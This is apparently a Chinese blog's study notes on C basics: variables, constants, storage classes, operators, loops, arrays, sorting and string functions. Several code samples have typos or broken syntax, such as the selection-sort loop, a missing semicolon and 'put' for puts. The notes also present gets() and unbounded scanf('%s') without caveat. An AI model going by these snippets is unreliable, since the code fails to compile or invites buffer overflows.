NULL（所有字节的值都是 0），其他所有变量的初始值是未定义的。\nC 中的变量声明变量声明向编译器保证变量以指定的类型和名称存在，这样编译器在不需要知道变量完整细节的情况下也能继续进一步的编译。变量声明只在编译时有它的意义，在程序连接时编译器需要实际的变量声明。\n变量的声明有两种情况：\n\n1、一种是需要建立存储空间的。例如：int a 在声明的时候就已经建立了存储空间。\n2、另一种是不需要建立存储空间的，通过使用extern关键字声明变量名而不定义它。 例如：extern int a 其中变量 a 可以在别的文件中定义的。\n除非有extern关键字，否则都是变量的定义。\n\nextern int i; //声明，不是定义int i; //声明，也是定义#include &lt;stdio.h&gt;  // 函数外定义变量 x 和 y int x; int y; int addtwonum() &#123;    // 函数内声明变量 x 和 y 为外部变量    extern int x;    extern int y;    // 给外部变量（全局变量）x 和 y 赋值    x = 1;    y = 2;    return x+y;&#125;int main() &#123;    int result;    // 调用函数 addtwonum    result = addtwonum();    printf(&quot;result 为: %d&quot;,result);    return 0;&#125;\n\n当上面的代码被编译和执行时，它会产生下列结果：\nresult 为: 3\n\n如果需要在一个源文件中引用另外一个源文件中定义的变量，我们只需在引用的文件中将变量加上 extern 关键字的声明即可。\naddtwonum.c 文件代码：#include &lt;stdio.h&gt;/*外部变量声明*/extern int x ;extern int y ;int addtwonum() &#123;    return x+y;&#125;\n\ntest.c 文件代码：#include &lt;stdio.h&gt;/*定义两个全局变量*/int x=1; int y=2;int addtwonum();int main(void) &#123;    int result;    result = addtwonum();    printf(&quot;result 为: %d\\n&quot;,result);        return 0;&#125;\n\n当上面的代码被编译和执行时，它会产生下列结果：\nresult 为: 3\n\nC 中的左值（Lvalues）和右值（Rvalues）C 中有两种类型的表达式：\n\n**左值（lvalue）：**指向内存位置的表达式被称为左值（lvalue）表达式。左值可以出现在赋值号的左边或右边。\n**右值（rvalue）：**术语右值（rvalue）指的是存储在内存中某些地址的数值。右值是不能对其进行赋值的表达式，也就是说，右值可以出现在赋值号的右边，但不能出现在赋值号的左边。\n\n变量是左值，因此可以出现在赋值号的左边。数值型的字面值是右值，因此不能被赋值，不能出现在赋值号的左边。下面是一个有效的语句：\nint g = 20;\n\n但是下面这个就不是一个有效的语句，会生成编译时错误：\n10 = 20;\n\nC 常量常量是固定值，在程序执行期间不会改变。这些固定的值，又叫做字面量。\n常量可以是任何的基本数据类型，比如整数常量、浮点常量、字符常量，或字符串字面值，也有枚举常量。\n常量就像是常规的变量，只不过常量的值在定义后不能进行修改。\n整数常量整数常量可以是十进制、八进制或十六进制的常量。前缀指定基数：0x 或 0X 表示十六进制，0 表示八进制，不带前缀则默认表示十进制。\n整数常量也可以带一个后缀，后缀是 U 和 L 的组合，U 表示无符号整数（unsigned），L 表示长整数（long）。后缀可以是大写，也可以是小写，U 和 L 的顺序任意。\n下面列举几个整数常量的实例：\n212         /* 合法的 */215u        /* 合法的 */0xFeeL      /* 合法的 */078         /* 非法的：8 不是八进制的数字 */032UU       /* 非法的：不能重复后缀 */\n\n以下是各种类型的整数常量的实例：\n85         /* 十进制 */0213       /* 八进制 */0x4b       /* 十六进制 */30         /* 整数 */30u        /* 无符号整数 */30l        /* 长整数 */30ul       /* 无符号长整数 */\n\n浮点常量\n浮点常量由整数部分、小数点、小数部分和指数部分组成。您可以使用小数形式或者指数形式来表示浮点常量。\n当使用小数形式表示时，必须包含整数部分、小数部分，或同时包含两者。当使用指数形式表示时， 必须包含小数点、指数，或同时包含两者。带符号的指数是用 e 或 E 引入的。\n\n下面列举几个浮点常量的实例：\n3.14159       /* 合法的 */314159E-5L    /* 合法的 */510E          /* 非法的：不完整的指数 */210f          /* 非法的：没有小数或指数 */.e55          /* 非法的：缺少整数或分数 */\n\n字符常量\n字符常量是括在单引号中，例如，’x’ 可以存储在 char 类型的简单变量中。\n字符常量可以是一个普通的字符（例如 ‘x’）、一个转义序列（例如 ‘\\t’），或一个通用的字符（例如 ‘\\u02C0’）。\n在 C 中，有一些特定的字符，当它们前面有反斜杠时，它们就具有特殊的含义，被用来表示如换行符（\\n）或制表符（\\t）等。\n\n更多的转义序列码\n\n\n\n转义序列\n含义\n\n\n\n\\\n\\ 字符\n\n\n‘\n‘ 字符\n\n\n“\n“ 字符\n\n\n?\n? 字符\n\n\n\\a\n警报铃声\n\n\n\\b\n退格键\n\n\n\\f\n换页符\n\n\n\\n\n换行符\n\n\n\\r\n回车\n\n\n\\t\n水平制表符\n\n\n\\v\n垂直制表符\n\n\n\\ooo\n一到三位的八进制数\n\n\n\\xhh . . .\n一个或多个数字的十六进制数\n\n\n例:\n\\#include &lt;stdio.h&gt;  int main() &#123;    \tprintf(&quot;Hello\\tWorld\\n\\n&quot;);    return 0; &#125;\n\n当上面的代码被编译和执行时，它会产生下列结果：\nHello   World\n\n字符串常量字符串字面值或常量是括在双引号 “” 中的。一个字符串包含类似于字符常量的字符：普通的字符、转义序列和通用的字符。\n您可以使用空格做分隔符，把一个很长的字符串常量进行分行。\n下面的实例显示了一些字符串常量。下面这三种形式所显示的字符串是相同的。\n&quot;hello, dear&quot;&quot;hello, \\dear&quot;&quot;hello, &quot; &quot;d&quot; &quot;ear&quot;\n\n定义常量在 C 中，有两种简单的定义常量的方式：\n\n使用 #define 预处理器。\n使用 const 关键字。\n\n#define 预处理器下面是使用 #define 预处理器定义常量的形式：\n#define identifier value\n\n例:\n#include &lt;stdio.h&gt; #define LENGTH 10   #define WIDTH  5#define NEWLINE &#x27;\\n&#x27; int main()&#123;    int area;       area = LENGTH * WIDTH;   printf(&quot;value of area : %d&quot;, area);   printf(&quot;%c&quot;, NEWLINE);    return 0;&#125;\n\n当上面的代码被编译和执行时，它会产生下列结果：\nvalue of area : 50\n\nconst 关键字您可以使用 const 前缀声明指定类型的常量，如下所示：\nconst type variable = value;\n\n\nconst 声明常量要在一个语句内完成：\n\n例：\n#include &lt;stdio.h&gt; int main()&#123;   const int  LENGTH = 10;   const int  WIDTH  = 5;   const char NEWLINE = &#x27;\\n&#x27;;   int area;        area = LENGTH * WIDTH;   printf(&quot;value of area : %d&quot;, area);   printf(&quot;%c&quot;, NEWLINE);    return 0;&#125;\n\n当上面的代码被编译和执行时，它会产生下列结果：\nvalue of area : 50\n\n把常量定义为大写字母形式，是一个很好的编程习惯。\nC 存储类hideToggle 点我查看\n存储类定义 C 程序中变量&#x2F;函数的范围（可见性）和生命周期。这些说明符放置在它们所修饰的类型之前。下面列出 C 程序中可用的存储类：\n\nauto\nregister\nstatic\nextern\n\nauto 存储类auto 存储类是所有局部变量默认的存储类。\n&#123;   int mount;   auto int month;&#125;\n\n上面的实例定义了两个带有相同存储类的变量，auto 只能用在函数内，即 auto 只能修饰局部变量。\nregister 存储类register 存储类用于定义存储在寄存器中而不是 RAM 中的局部变量。这意味着变量的最大尺寸等于寄存器的大小（通常是一个字），且不能对它应用一元的 ‘&amp;’ 运算符（因为它没有内存位置）。\n&#123;   register int  miles;&#125;\n\n寄存器只用于需要快速访问的变量，比如计数器。还应注意的是，定义 ‘register’ 并不意味着变量将被存储在寄存器中，它意味着变量可能存储在寄存器中，这取决于硬件和实现的限制。\nstatic 存储类static 存储类指示编译器在程序的生命周期内保持局部变量的存在，而不需要在每次它进入和离开作用域时进行创建和销毁。因此，使用 static 修饰局部变量可以在函数调用之间保持局部变量的值。\nstatic 修饰符也可以应用于全局变量。当 static 修饰全局变量时，会使变量的作用域限制在声明它的文件内。\n全局声明的一个 static 变量或方法可以被任何函数或方法调用，只要这些方法出现在跟 static 变量或方法同一个文件中。\n以下实例演示了 static 修饰全局变量和局部变量的应用：\n#include &lt;stdio.h&gt; /* 函数声明 */void func1(void); static int count=10;        /* 全局变量 - static 是默认的 */ int main()&#123;  while (count--) &#123;      func1();  &#125;  return 0;&#125; void func1(void)&#123;/* &#x27;thingy&#x27; 是 &#x27;func1&#x27; 的局部变量 - 只初始化一次 * 每次调用函数 &#x27;func1&#x27; &#x27;thingy&#x27; 值不会被重置。 */                  static int thingy=5;  thingy++;  printf(&quot; thingy 为 %d ， count 为 %d\\n&quot;, thingy, count);&#125;\n\n实例中 count 作为全局变量可以在函数内使用，thingy 使用 static 修饰后，不会在每次调用时重置。\n可能您现在还无法理解这个实例，因为我已经使用了函数和全局变量，这两个概念目前为止还没进行讲解。即使您现在不能完全理解，也没有关系，后续的章节我们会详细讲解。当上面的代码被编译和执行时，它会产生下列结果：\nthingy 为 6 ， count 为 9thingy 为 7 ， count 为 8thingy 为 8 ， count 为 7thingy 为 9 ， count 为 6thingy 为 10 ， count 为 5thingy 为 11 ， count 为 4thingy 为 12 ， count 为 3thingy 为 13 ， count 为 2thingy 为 14 ， count 为 1thingy 为 15 ， count 为 0\n\nextern 存储类extern 存储类用于提供一个全局变量的引用，全局变量对所有的程序文件都是可见的。当您使用 extern 时，对于无法初始化的变量，会把变量名指向一个之前定义过的存储位置。\n当您有多个文件且定义了一个可以在其他文件中使用的全局变量或函数时，可以在其他文件中使用 extern 来得到已定义的变量或函数的引用。可以这么理解，extern 是用来在另一个文件中声明一个全局变量或函数。\nextern 修饰符通常用于当有两个或多个文件共享相同的全局变量或函数的时候，如下所示：\n第一个文件：main.c\n#include &lt;stdio.h&gt; int count ;extern void write_extern(); int main()&#123;   count = 5;   write_extern();&#125;\n\n第二个文件：support.c\n#include &lt;stdio.h&gt; extern int count; void write_extern(void)&#123;   printf(&quot;count is %d\\n&quot;, count);&#125;\n\n在这里，第二个文件中的 extern 关键字用于声明已经在第一个文件 main.c 中定义的 count。现在 ，编译这两个文件，如下所示：\n$ gcc main.c support.c\n\n这会产生 a.out 可执行程序，当程序被执行时，它会产生下列结果：\ncount is 5\n\nendhideToggle\nC 运算符运算符是一种告诉编译器执行特定的数学或逻辑操作的符号。C 语言内置了丰富的运算符，并提供了以下类型的运算符：\n\n算术运算符\n关系运算符\n逻辑运算符\n位运算符\n赋值运算符\n杂项运算符\n\n本章将逐一介绍算术运算符、关系运算符、逻辑运算符、位运算符、赋值运算符和其他运算符。\n算术运算符下表显示了 C 语言支持的所有算术运算符。假设变量 A 的值为 10，变量 B 的值为 20，则：\n\n\n\n运算符\n描述\n实例\n\n\n\n+\n把两个操作数相加\nA + B 将得到 30\n\n\n-\n从第一个操作数中减去第二个操作数\nA - B 将得到 -10\n\n\n*\n把两个操作数相乘\nA * B 将得到 200\n\n\n&#x2F;\n分子除以分母\nB &#x2F; A 将得到 2\n\n\n%\n取模运算符，整除后的余数\nB % A 将得到 0\n\n\n++\n自增运算符，整数值增加 1\nA++ 将得到 11\n\n\n–\n自减运算符，整数值减少 1\nA– 将得到 9\n\n\n关系运算符下表显示了 C 语言支持的所有关系运算符。假设变量 A 的值为 10，变量 B 的值为 20，则：\n\n\n\n运算符\n描述\n实例\n\n\n\n&#x3D;&#x3D;\n检查两个操作数的值是否相等，如果相等则条件为真。\n(A &#x3D;&#x3D; B) 为假。\n\n\n!&#x3D;\n检查两个操作数的值是否相等，如果不相等则条件为真。\n(A !&#x3D; B) 为真。\n\n\n&gt;\n检查左操作数的值是否大于右操作数的值，如果是则条件为真。\n(A &gt; B) 为假。\n\n\n&lt;\n检查左操作数的值是否小于右操作数的值，如果是则条件为真。\n(A &lt; B) 为真。\n\n\n&gt;&#x3D;\n检查左操作数的值是否大于或等于右操作数的值，如果是则条件为真。\n(A &gt;&#x3D; B) 为假。\n\n\n&lt;&#x3D;\n检查左操作数的值是否小于或等于右操作数的值，如果是则条件为真。\n(A &lt;&#x3D; B) 为真。\n\n\n逻辑运算符下表显示了 C 语言支持的所有关系逻辑运算符。假设变量 A 的值为 1，变量 B 的值为 0，则：\n\n\n\n运算符\n描述\n实例\n\n\n\n&amp;&amp;\n称为逻辑与运算符。如果两个操作数都非零，则条件为真。\n(A &amp;&amp; B) 为假。\n\n\n||\n称为逻辑或运算符。如果两个操作数中有任意一个非零，则条件为真。\n(A || B) 为真。\n\n\n!\n称为逻辑非运算符。用来逆转操作数的逻辑状态。如果条件为真则逻辑非运算符将使其为假。\n!(A &amp;&amp; B) 为真。\n\n\n位运算符位运算符作用于位，并逐位执行操作。&amp;、 | 和 ^ 的真值表如下所示：\n\n\n\np\nq\np &amp; q\np | q\np ^ q\n\n\n\n0\n0\n0\n0\n0\n\n\n0\n1\n0\n1\n1\n\n\n1\n1\n1\n1\n0\n\n\n1\n0\n0\n1\n1\n\n\n假设如果 A &#x3D; 60，且 B &#x3D; 13，现在以二进制格式表示，它们如下所示：\nA &#x3D; 0011 1100\nB &#x3D; 0000 1101\n-—————-\nA&amp;B &#x3D; 0000 1100\nA|B &#x3D; 0011 1101\nA^B &#x3D; 0011 0001\n~A &#x3D; 1100 0011\n下表显示了 C 语言支持的位运算符。假设变量 A 的值为 60，变量 B 的值为 13，则：\n\n\n\n运算符\n描述\n实例\n\n\n\n&amp;\n按位与操作，按二进制位进行”与”运算。运算规则：0&amp;0=0; 0&amp;1=0; 1&amp;0=0; 1&amp;1=1;\n(A &amp; B) 将得到 12，即为 0000 1100\n\n\n|\n按位或运算符，按二进制位进行”或”运算。运算规则：&#96;0\n0&#x3D;0; 0\n\n\n^\n异或运算符，按二进制位进行”异或”运算。运算规则：0^0=0; 0^1=1; 1^0=1; 1^1=0;\n(A ^ B) 将得到 49，即为 0011 0001\n\n\n~\n取反运算符，按二进制位进行”取反”运算。运算规则：~1=-2; ~0=-1;\n(~A ) 将得到 -61，即为 1100 0011，一个有符号二进制数的补码形式。\n\n\n&lt;&lt;\n二进制左移运算符。将一个运算对象的各二进制位全部左移若干位（左边的二进制位丢弃，右边补0）。\nA &lt;&lt; 2 将得到 240，即为 1111 0000\n\n\n&gt;&gt;\n二进制右移运算符。将一个数的各二进制位全部右移若干位，正数左补0，负数左补1，右边丢弃。\nA &gt;&gt; 2 将得到 15，即为 0000 1111\n\n\n赋值运算符下表列出了 C 语言支持的赋值运算符：\n\n\n\n运算符\n描述\n实例\n\n\n\n&#x3D;\n简单的赋值运算符，把右边操作数的值赋给左边操作数\nC &#x3D; A + B 将把 A + B 的值赋给 C\n\n\n+&#x3D;\n加且赋值运算符，把右边操作数加上左边操作数的结果赋值给左边操作数\nC +&#x3D; A 相当于 C &#x3D; C + A\n\n\n-&#x3D;\n减且赋值运算符，把左边操作数减去右边操作数的结果赋值给左边操作数\nC -&#x3D; A 相当于 C &#x3D; C - A\n\n\n*&#x3D;\n乘且赋值运算符，把右边操作数乘以左边操作数的结果赋值给左边操作数\nC *&#x3D; A 相当于 C &#x3D; C * A\n\n\n&#x2F;&#x3D;\n除且赋值运算符，把左边操作数除以右边操作数的结果赋值给左边操作数\nC &#x2F;&#x3D; A 相当于 C &#x3D; C &#x2F; A\n\n\n%&#x3D;\n求模且赋值运算符，求两个操作数的模赋值给左边操作数\nC %&#x3D; A 相当于 C &#x3D; C % A\n\n\n&lt;&lt;&#x3D;\n左移且赋值运算符\nC &lt;&lt;&#x3D; 2 等同于 C &#x3D; C &lt;&lt; 2\n\n\n&gt;&gt;&#x3D;\n右移且赋值运算符\nC &gt;&gt;&#x3D; 2 等同于 C &#x3D; C &gt;&gt; 2\n\n\n&amp;&#x3D;\n按位与且赋值运算符\nC &amp;&#x3D; 2 等同于 C &#x3D; C &amp; 2\n\n\n^&#x3D;\n按位异或且赋值运算符\nC ^&#x3D; 2 等同于 C &#x3D; C ^ 2\n\n\n|&#x3D;\n按位或且赋值运算符\nC |&#x3D; 2 等同于 C &#x3D; C | 2\n\n\n杂项运算符 ↦ sizeof &amp; 三元下表列出了 C 语言支持的其他一些重要的运算符，包括 sizeof 和 ? :。\n\n\n\n运算符\n描述\n实例\n\n\n\nsizeof()\n返回变量的大小。\nsizeof(a) 将返回 4，其中 a 是整数。\n\n\n&amp;\n返回变量的地址。\n&a; 将给出变量的实际地址。\n\n\n*\n指向一个变量。\n*a; 将指向一个变量。\n\n\n? :\n条件表达式\n如果条件为真 ? 则值为 X : 否则值为 Y\n\n\nC 中的运算符优先级运算符的优先级确定表达式中项的组合。这会影响到一个表达式如何计算。某些运算符比其他运算符有更高的优先级，例如，乘除运算符具有比加减运算符更高的优先级。\n例如 x &#x3D; 7 + 3 * 2，在这里，x 被赋值为 13，而不是 20，因为运算符 * 具有比 + 更高的优先级，所以首先计算乘法 3*2，然后再加上 7。\n下表将按运算符优先级从高到低列出各个运算符，具有较高优先级的运算符出现在表格的上面，具有较低优先级的运算符出现在表格的下面。在表达式中，较高优先级的运算符会优先被计算。\n\n\n\n类别\n运算符\n结合性\n\n\n\n后缀\n() [] -&gt; . ++ - -\n从左到右\n\n\n一元\n+ - ! ~ ++ - - (type)* &amp; sizeof\n从右到左\n\n\n乘除\n* &#x2F; %\n从左到右\n\n\n加减\n+ -\n从左到右\n\n\n移位\n&lt;&lt; &gt;&gt;\n从左到右\n\n\n关系\n&lt; &lt;&#x3D; &gt; &gt;&#x3D;\n从左到右\n\n\n相等\n&#x3D;&#x3D; !&#x3D;\n从左到右\n\n\n位与 AND\n&amp;\n从左到右\n\n\n位异或 XOR\n^\n从左到右\n\n\n位或 OR\n|\n从左到右\n\n\n逻辑与 AND\n&amp;&amp;\n从左到右\n\n\n逻辑或 OR\n||\n从左到右\n\n\n条件\n?:\n从右到左\n\n\n赋值\n&#x3D; +&#x3D; -&#x3D; *&#x3D; &#x2F;&#x3D; %&#x3D;&gt;&gt;&#x3D; &lt;&lt;&#x3D; &amp;&#x3D; ^&#x3D; |&#x3D;\n从右到左\n\n\n逗号\n,\n从左到右\n\n\nC 判断判断结构要求程序员指定一个或多个要评估或测试的条件，以及条件为真时要执行的语句（必需的）和条件为假时要执行的语句（可选的）。\nC 语言把任何非零和非空的值假定为 true，把零或 null 假定为 false。\n下面是大多数编程语言中典型的判断结构的一般形式：\n\n判断语句C 语言提供了以下类型的判断语句。点击链接查看每个语句的细节。\n\n\n\n语句\n描述\n\n\n\nif 语句 \n一个 if 语句 由一个布尔表达式后跟一个或多个语句组成。\n\n\nif…else 语句 \n一个 if 语句 后可跟一个可选的 else 语句，else 语句在布尔表达式为假时执行。\n\n\n嵌套 if 语句 \n您可以在一个 if 或 else if 语句内使用另一个 if 或 else if 语句。\n\n\nswitch 语句 \n一个 switch 语句允许测试一个变量等于多个值时的情况。\n\n\n嵌套 switch 语句 \n您可以在一个 switch 语句内使用另一个 switch 语句。\n\n\n? : 运算符(三元运算符)我们已经在前面的章节中讲解了 条件运算符 ? :，可以用来替代 if…else 语句。它的一般形式如下：\nExp1 ? Exp2 : Exp3;\n\n其中，Exp1、Exp2 和 Exp3 是表达式。请注意，冒号的使用和位置。\n? 表达式的值是由 Exp1 决定的。如果 Exp1 为真，则计算 Exp2 的值，结果即为整个表达式的值。如果 Exp1 为假，则计算 Exp3 的值，结果即为整个表达式的值。\n\n例:\n输入一个数字判断他是奇数还是偶数\n#include&lt;stdio.h&gt; int main()&#123;    int num;     printf(&quot;输入一个数字 : &quot;);    scanf(&quot;%d&quot;,&amp;num);     (num%2==0)?printf(&quot;偶数&quot;):printf(&quot;奇数&quot;);&#125;\n\nC 循环有的时候，我们可能需要多次执行同一块代码。一般情况下，语句是按顺序执行的：函数中的第一个语句先执行，接着是第二个语句，依此类推。\n编程语言提供了更为复杂执行路径的多种控制结构。\n循环语句允许我们多次执行一个语句或语句组，下面是大多数编程语言中循环语句的流程图：\n\n循环类型C 语言提供了以下几种循环类型。点击链接查看每个类型的细节。\n\n\n\n循环类型\n描述\n\n\n\nwhile 循环 \n当给定条件为真时，重复语句或语句组。它会在执行循环主体之前测试条件。\n\n\nfor 循环 \n多次执行一个语句序列，简化管理循环变量的代码。\n\n\ndo…while 循环 \n除了它是在循环主体结尾测试条件外，其他与 while 语句类似。\n\n\n嵌套循环 \n您可以在 while、for 或 do..while 循环内使用一个或多个循环。\n\n\n循环控制语句循环控制语句改变你代码的执行顺序。通过它可以实现代码的跳转。\n\n\n\n控制语句\n描述\n\n\n\nbreak 语句\n终止循环或 switch 语句，程序流将继续执行紧接着循环或 switch 的下一条语句。\n\n\ncontinue 语句\n告诉一个循环体立刻停止本次循环迭代，重新开始下次循环迭代。\n\n\ngoto 语句\n将控制转移到被标记的语句。但是不建议在程序中使用 goto 语句。\n\n\n无限循环如果条件永远不为假，则循环将变成无限循环。for 循环在传统意义上可用于实现无限循环。由于构成循环的三个表达式中任何一个都不是必需的，可以将某些条件表达式留空来构成一个无限循环。\n#include &lt;stdio.h&gt; int main ()&#123;   for( ; ; )   &#123;      printf(&quot;该循环会永远执行下去！\\n&quot;);   &#125;   return 0;&#125;\n","categories":["笔记"],"tags":["C语言","笔记"]},{"title":"C语言-2","url":"/2022/11/22/c_learn_2/","content":"学习目标：\n\n1、一维数组、二维数组、字符数组的定义、引用、初始化\n2、利用数组批量处理数据。\n\n一、数组的概念1.数组是一组有序数据的集合\n2.数组中每一个元素都属于同一个数据类型\n二、一维数组1、定义\n类型关键字数组名[常量表达式]\n类型关键字：int、float等\n数组名：遵循标识符命名规则\n不允许使用C语言中的关键字\n由字母、数字、下划线组成，且首字母必须为字母或下划线，不能为数字\n\n\n[]不是【】\n常量表达式\ninta[5]\ninta[3+2]\ninta[N]&#x2F;&#x2F;N是提前声明的符号常量\n\n\n\n\n\n2、引用数组名[下标]\n例：a[4]&#x2F;&#x2F;引用数组中第五个元素\n3、初始化\n在定义数组时，对数组元素赋初值\nint a[6]&#x3D;{1,2,3,4,5,6};\n可只给一部分数组元素赋初值，未赋值部分默认为0\nint a[6]&#x3D;{1,2,3};\n未赋初值的数组，各元素值不确定（取决于不同的编译器）\n\n\n\n初始化的数据个数确定时可以省略数组长度。\n例：inta[]&#x3D;{1,2,3};\n\n\n数组中全部元素初始化为0。\n例：inta[6]&#x3D;{0};\n\n\n\n4、一维数组使用示例&#x2F;&#x2F;输出斐波那契数列前30个数#include &lt;stdio.h&gt;int main()&#123;    int f[30]=&#123;1,1&#125;    int i;    printf(&quot;%d\\t%d\\t&quot;,f[0],f[1]);    for(i=2;i&lt;30;i++)        &#123;            if(i%5==0)                printf(&quot;\\n&quot;);            f[i]=f[i-1]+f[i-2];            printf(&quot;%d\\t&quot;,f[i]);        &#125;    return 0;&#125;\n\n5、排序算法参考：https://www.cnblogs.com/onepixel/p/7674659.html \n交换排序：所谓交换，就是根据序列中两个记录键值的比较结果来对换这两个记录在序列中的位置，交换排序的特点是：将键值较大的记录向序列的尾部移动，键值较小的记录向序列的前部移动。\nfor(j=0;j&lt;5;j++)&#123;    for(i=j+1;i&lt;6;i++)    &#123;        if(a[j]&gt;a[i])        &#123;t=a[j];a[j]=a[i];a[i]=t;&#125;        &#125;    &#125;&#125;\n\n选择排序\n原理：假设长度为n的数组arr，要按照从小到大排序，那么先从n个数字中找到最小值min1，如果最小值min1的位置不在数组的最左端(也就是min1不等于arr[0])，则将最小值min1和arr[0]交换，接着在剩下的n-1个数字中找到最小值min2，如果最小值min2不等于arr[1]，则交换这两个数字，依次类推，直到数组arr有序排列。\n步骤：1.首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置。2.再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。3.重复第二步，直到所有元素均排序完毕。\n\nfor(j=0;j&lt;5;j++)&#123;    for(k=j;i=j+1;i&lt;6;i++)        if(a[k]&gt;a[i])            k=i;    if(k!=j)        &#123;t=a[k],a[k]=a[j];a[j]=t&#125;&#125;\n\n冒泡排序：\n原理：假设长度为n的数组arr，要按照从小到大排序。则冒泡排序的具体过程可以描述为：首先从数组的第一个元素开始到数组最后一个元素为止，对数组中相邻的两个元素进行比较，如果位于数组左端的元素大于数组右端的元素，则交换这两个元素在数组中的位置。这样操作后数组最右端的元素即为该数组中所有元素的最大值。接着对该数组除最右端的n-1个元素进行同样的操作，再接着对剩下的n-2个元素做同样的操作，直到整个数组有序排列。\n步骤：1、比较相邻的元素。如果第一个比第二个大，就交换他们两个。2、对每一对相邻元素做同样的工作，从开始第一对到结尾的最后一对。在这一点，最后的元素应该会是最大的数。3、针对所有的元素重复以上的步骤，除了最后一个。4、持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。\n\nfor(j=0;j&lt;5;j++)    for(i=0;i&lt;5-j;i++)        if(a[i]&gt;a[i+1])        &#123;......&#125;\n\n三、二维数组1、定义note blue modern类型关键字 数组名[常量表达式1][常量表达式2]endnote\n例：\nint a[3][4];float b[5][10];\n\n2、引用note blue modern数组名[下标1][下标2]endnote\n例：\na[0][0]     a[0][1]     a[0][2]     a[0][3]a[1][0]     a[1][1]     a[1][2]     a[1][3]a[2][0]     a[2][1]     a[2][2]     a[2][3]\n\n3、初始化1、分行初始化int a[2][3]=&#123;&#123;1,2,3&#125;,&#123;4,5,6&#125;&#125;\n\n2、按存放数据整体初始化int a[3][2]=&#123;1,2,3,4,5,6&#125;\n\n3、部分元素初始化int a[3][3]=&#123;&#123;1&#125;,&#123;&#125;,&#123;4,5,6&#125;&#125;\n\n4、省略第一维初始化int a[][3]=&#123;&#123;1&#125;,&#123;&#125;,&#123;4,5,6&#125;&#125;\n\n4、输入输出1、输入for(i=0;i&lt;3;i++)    for(j=0,j&lt;4;j++)        scanf(&quot;%d&quot;,&amp;a[i][j]);\n\n2、输出for(i=0;i&lt;3;i++)&#123;\tfor(j=0,j&lt;4;j++)    \tprintf(&quot;%d&quot;,a[i][j]);\tprintf(&quot;\\n&quot;);&#125;\n\n四、字符数组1、C语言中没有表示字符串的类型，也没有字符串变量，字符串用字符数组来存放。2、字符型数据以字符的ASCII码存放在存储单元中，一般占一个字节。\n1、定义char c[10],a[5];\n\n2、初始化\n字符常量初始化\nchar c[6]=&#123;&#x27;H&#x27;,&#x27;a&#x27;,&#x27;p&#x27;,&#x27;p&#x27;,&#x27;y&#x27;,&#x27;!&#x27;&#125;;             //sizeof(c)=6char c[]=&#123;&#x27;H&#x27;,&#x27;a&#x27;,&#x27;p&#x27;,&#x27;p&#x27;,&#x27;y&#x27;,&#x27;!&#x27;&#125;;              //提供初值个数与定义数组长度相同，可省略长度char c[]=&#123;&#x27;H&#x27;,&#x27;a&#x27;,&#x27;p&#x27;,&#x27;p&#x27;,&#x27;y&#x27;,&#x27;!&#x27;,&#x27;\\0&#x27;&#125;;           //sizeof(c)=7\n\n字符串常量初始化\nchar c[]=&#123;&quot;Happy!&quot;&#125;;             //sizeof(c)=7因为字符串末尾自动加一个&#x27;\\0&#x27;char c[]=&quot;Happy&quot;;//等同于charc[]=&#123;&#x27;H&#x27;,&#x27;a&#x27;,&#x27;p&#x27;,&#x27;p&#x27;,&#x27;y&#x27;,&#x27;!&#x27;,&#x27;\\0&#x27;&#125;;//不同于charc[]=&#123;&#x27;H&#x27;,&#x27;a&#x27;,&#x27;p&#x27;,&#x27;p&#x27;,&#x27;y&#x27;,&#x27;!&#x27;&#125;;\n\n关于’\\0’\n\n\nnote blue modernC系统在用字符数组存储字符串常量时，会自动在末尾加一个’\\0’作为结束符\n字符数组并不要求它的最后一个字符为’\\0‘，因此charc[6]&#x3D;{‘H’,’a’,’p’,’p’,’y’,’!’};完全合法\n由于系统在处理在字符串常量时会自动加’\\0’，为了一致及方便，通常处理时，人为的也加上’\\0’endnote\n3、引用\n单个元素的引用\n\nnote blue modern允许引用单个字符元素，输入或输出一个字符。endnote\nchar c[7]= &quot;happy!&quot;;scanf(&quot;%c&quot;,&amp;c[2]);               // 对c[2]元素赋一个字符printf(&quot;%c&quot;,c[3]);               // 输出c[3]元素p\n\nnote blue modern以字符串形式进行输入输出endnote\nchar c[7];scanf(&quot;%s&quot;,c);              //注意此处不加&amp;因为在C语言中，数组名代表第一个数组元素的地址printf(&quot;%s&quot;,c);             //输出该字符串printf(&quot;%o&quot;,c);             //八进制形式输出数组c的起始地址，即第一个数组元素的地址\n\nnote blue modern如果利用一个scanf函数输入多个字符串，应在输入时，以空格隔开endnote\nchar a[5],b[5],c[5];scanf(&quot;%s%s%s&quot;,a,b,c);              // 输入How are you分别将三个单词赋给a,b,c三个数组，注意：// 输入格式控制中间没有空格printf(&quot;%s%s%s&quot;,a,b,c);             // 输出How are you\n\n4、使用字符串处理函数\nput(字符数组)将一个字符串输出到终端作用等效于printf(“%s”,c);也可以输出转义字符\ngets(字符数组)从终端输入一个字符串到字符数组，并且得到一个函数值，该函数值为字符数组的起始地址。相比于scanf(“%s”,c);可以返回数组的地址值\n\n\n\nputs与gets函数都仅仅只能处理一个字符串\nstrcat(字符数组1,字符数组2)把字符串2接到字符串1后面，结果放到字符数组1中，函数调用后得到的函数值为字符数组1的地址\n\nnote red modern注：字符数组1的长度必须足够大，以便容纳连接后的新字符串。字符数组定义及初始化时，长度不能省略。endnote\n\nstrcpy(字符数组1,字符串2)将字符串2复制到字符数组1中去\n\nnote red modern注：字符数组1的长度不小于字符串2的长度；字符数组1必须写成数组名形式，字符串2可以是字符数组名，也可以是字符串常量endnote\n\nstrncpy(str1,str2,2)\n\n将str2中最前面的两个字符复制到str1中\n\nstrcmp(字符串1,字符串2)\n\n比较字符串1和字符串2\n若相等，函数值为0；\n若字符串1&gt;字符串2，函数值为一个正整数；\n若字符串1&lt;字符串2，函数值为一个负整数。\n\nstrlen(字符数组)\n\n测试字符串实际长度\n\nstrlwr(字符串)\n\n将字符串中大写字母换成小写字母\n\nstrupr(字符串)\n\n将字符串中的小写字母换成大写字母\n","categories":["笔记"],"tags":["C语言","笔记"]},{"title":"C语言-3","url":"/2022/11/23/c_learn_3/","content":"函数1、为什么需要：\n程序需要多次实现某一功能\n程序需要实现多种功能\n\n组装思想—&gt;模块化程序设计\n2、什么是函数：函数（function）：函数就是功能，每一个函数用来实现某一个特定的功能\n3、函数从哪来：\n库函数\n编译函数\n自己编写函数\n\n4、函数的分类\n无参函数\n有参函数\n\n5、其他\n一个C程序由一个或多个源文件组成\n一个源文件由一个或多个函数组成\n\n怎么定义函数1